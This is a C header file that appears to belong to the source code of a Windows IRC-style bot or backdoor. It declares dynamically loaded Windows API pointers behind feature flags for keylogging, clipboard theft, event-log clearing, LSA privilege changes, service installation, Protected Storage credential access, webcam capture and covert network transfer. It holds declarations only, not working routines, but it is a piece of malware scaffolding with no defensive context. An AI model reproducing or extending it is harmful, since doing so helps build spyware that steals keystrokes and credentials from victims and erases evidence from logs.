
// kernel32.dll function variables
//extern SEM fSetErrorMode;
//extern CT32S fCreateToolhelp32Snapshot;
//extern P32F fProcess32First;
//extern P32N fProcess32Next;
//extern M32F fModule32First;
//extern GDFSE fGetDiskFreeSpaceEx;
//extern GLDS fGetLogicalDriveStrings;
//extern GDT fGetDriveType;
//extern SP fSearchPath;
//extern QPC fQueryPerformanceCounter;
//extern QPF fQueryPerformanceFrequency;
//extern RSP fRegisterServiceProcess;
extern GCNA fGetComputerName;

// user32.dll function variables
extern SM fSendMessage;
extern CW fCloseWindow;
//extern FW fFindWindow;
extern IW fIsWindow;
//extern DW fDestroyWindow;
extern OC fOpenClipboard;
extern GCD fGetClipboardData;
extern CC fCloseClipboard;
//extern EWE fExitWindowsEx;
#ifndef NO_KEYLOG
extern GAKS fGetAsyncKeyState;
extern GKS fGetKeyState;
extern GWT fGetWindowText;
extern GFW fGetForegroundWindow;
#endif
#ifndef NO_WINDOWCTRL
//extern EW fEnumWindows;
extern GWI fGetWindowInfo;
extern GWTPI fGetWindowThreadProcessId;
extern SW fShowWindow;
//extern IWV fIsWindowVisible;
extern GCN fGetClassName;
#endif

// advapi32.dll function variables
extern ROKE fRegOpenKeyEx;
//extern RCKE fRegCreateKeyEx;
//extern RSVE fRegSetValueEx;
extern RQVE fRegQueryValueEx;
//extern RDV fRegDeleteValue;
//extern RDK fRegDeleteKey;
extern RCK fRegCloseKey;
//extern REKE fRegEnumKeyEx;
//extern REV fRegEnumValue;
//extern RQIK fRegQueryInfoKey;
#ifndef NO_PROCESS
//extern OTT fOpenThreadToken;
//extern OPT fOpenProcessToken;
//extern LPV fLookupPrivilegeValue;
//extern ATP fAdjustTokenPrivileges;
#endif
#ifndef NO_LSARESTRICT
extern LOP fLsaOpenPolicy;
extern LEAWUR fLsaEnumerateAccountsWithUserRight;
extern LLN2 fLsaLookupNames2;
extern LAAR fLsaAddAccountRights;
extern LRAR fLsaRemoveAccountRights;
extern LFM fLsaFreeMemory;
extern LC fLsaClose;
extern LNSTWE fLsaNtStatusToWinError;
#endif
extern OSCM fOpenSCManager;
extern CRS fCreateService;
extern SS fStartService;
extern OS fOpenService;
extern CSH fCloseServiceHandle;
extern SSCD fStartServiceCtrlDispatcher;
extern ESS fEnumServicesStatus;
extern CS fControlService;
extern DS fDeleteService;
extern IVSD fIsValidSecurityDescriptor;
#ifndef NO_SYSINFO
extern GUN fGetUserName;
#endif
#ifndef NO_CEL
extern CEL fClearEventLog;
extern CLEL fCloseEventLog;
extern OEL fOpenEventLog;
#endif
extern ILOU fImpersonateLoggedOnUser;
extern LSD fLockServiceDatabase;
extern QSLS fQueryServiceLockStatus;
extern CSC2 fChangeServiceConfig2;
extern USD fUnlockServiceDatabase;
extern RSCH fRegisterServiceCtrlHandler;
extern SSS fSetServiceStatus;

// gdi32.dll function variables
//extern CDC fCreateDC;
//extern CDIBS fCreateDIBSection;
//extern CCDC fCreateCompatibleDC;
//extern GDC fGetDeviceCaps;
//extern GDIBCT fGetDIBColorTable;
//extern SO fSelectObject;
//extern BB fBitBlt;
//extern DDC fDeleteDC;
//extern DO fDeleteObject;

// ws2_32.dll function variables
extern WSAS fWSAStartup;
extern WSASo fWSASocket;
//extern WSAAS fWSAAsyncSelect;
//extern WSAFDIS __fWSAFDIsSet;
//extern WSAI fWSAIoctl;
extern WSAGLE fWSAGetLastError;
extern WSAC fWSACleanup;
extern SOCK fsocket;
//extern IOCTLS fioctlsocket;
extern CON fconnect;
extern INTOA finet_ntoa;
extern IADDR finet_addr;
extern HTONS fhtons;
extern HTONL fhtonl;
//extern NTOHS fntohs;
//extern NTOHL fntohl;
extern SEND fsend;
extern SENDTO fsendto;
extern RECV frecv;
//extern RECVFROM frecvfrom;
//extern BIND fbind;
//extern SEL fselect;
//extern LIS flisten;
//extern ACC faccept;
extern SSO fsetsockopt;
extern GSN fgetsockname;
extern GHN fgethostname;
extern GHBN fgethostbyname;
//extern GHBA fgethostbyaddr;
extern GPN fgetpeername;
extern CLSO fclosesocket;
extern SD fshutdown;
#ifndef NO_NETSTATP
//extern GSBP fgetservbyport;
#endif

// wininet.dll function variables
extern IGCS fInternetGetConnectedState;
extern IGCSE fInternetGetConnectedStateEx;
extern HOR fHttpOpenRequest;
extern HSR fHttpSendRequest;
extern FGF fFtpGetFile;
extern FPF fFtpPutFile;
extern IC fInternetConnect;
extern IO fInternetOpen;
extern IOU fInternetOpenUrl;
extern ICU fInternetCrackUrl;
extern IRF fInternetReadFile;
extern ICH fInternetCloseHandle;

// icmp.dll function variables
#ifndef NO_PING
extern ICF fIcmpCreateFile;
extern ISE fIcmpSendEcho;
extern ICH fIcmpCloseHandle;
#endif

// netapi32.dll function variables
/*
//extern NSA fNetShareAdd;
extern NSD fNetShareDel;
extern NSE fNetShareEnum;
extern NSJA fNetScheduleJobAdd;
extern NABF fNetApiBufferFree;
extern NRTOD fNetRemoteTOD;
extern NUA fNetUserAdd;
extern NUD fNetUserDel;
extern NUE fNetUserEnum;
extern NUGI fNetUserGetInfo;
extern NMBS fNetMessageBufferSend;
*/
// dnsapi.dll function variables
extern DFRC fDnsFlushResolverCache;
extern DFRCEA fDnsFlushResolverCacheEntry_A;

// iphlpapi.dll function variables
extern GIT fGetIfTable;
extern GINT fGetIpNetTable;
extern DINE fDeleteIpNetEntry;
extern GTT fGetTcpTable;
extern GUT fGetUdpTable;
#ifndef NO_NETSTATP
extern AAGTETFS fAllocateAndGetTcpExTableFromStack;
extern AAGUETFS fAllocateAndGetUdpExTableFromStack;
#endif
#ifndef NO_ENETINFO
extern GNP fGetNetworkParams;
#endif

// mpr.dll function variables
extern WNAC2 fWNetAddConnection2;
extern WNAC2W fWNetAddConnection2W;
extern WNCC2 fWNetCancelConnection2;
extern WNCC2W fWNetCancelConnection2W;

// shell32.dll function variables
extern SE fShellExecute;
extern SHCN fSHChangeNotify;

// odbc32.dll function variables
extern SQLDC fSQLDriverConnect;
extern SQLSEA fSQLSetEnvAttr;
extern SQLED fSQLExecDirect;
extern SQLAH fSQLAllocHandle;
extern SQLFH fSQLFreeHandle;
extern SQLD fSQLDisconnect;

#ifndef NO_CAPTURE
// avicap32.dll function variables
extern cCCW fcapCreateCaptureWindow;
extern cGDD fcapGetDriverDescription;
#endif

// psapi function variables
extern GMFNE fGetModuleFileNameEx;
extern GMBN fGetModuleBaseName;
extern EPM fEnumProcessModules;
extern EP fEnumProcesses;
extern GPMI fGetProcessMemoryInfo;

#ifndef NO_PSTORE
//pstorec.dll function variables
extern PSCI fPStoreCreateInstance;
#endif

extern PRFS fPathRemoveFileSpec;

// globals for dynamic libraries
extern BOOL nokernel32;
extern BOOL nouser32;
extern BOOL noadvapi32;
extern BOOL noadvapi32lsa;
extern BOOL nogdi32;
extern BOOL nows2_32;
extern BOOL nowininet;
extern BOOL noicmp;
extern BOOL nonetapi32;
extern BOOL nodnsapi;
extern BOOL noiphlpapi;
extern BOOL noiphlpapinsp;
extern BOOL nompr;
extern BOOL noshell32;
extern BOOL noodbc32;
extern BOOL noavicap32;
extern BOOL nopsapi;
extern BOOL nopstore;
extern BOOL noshlwapi;
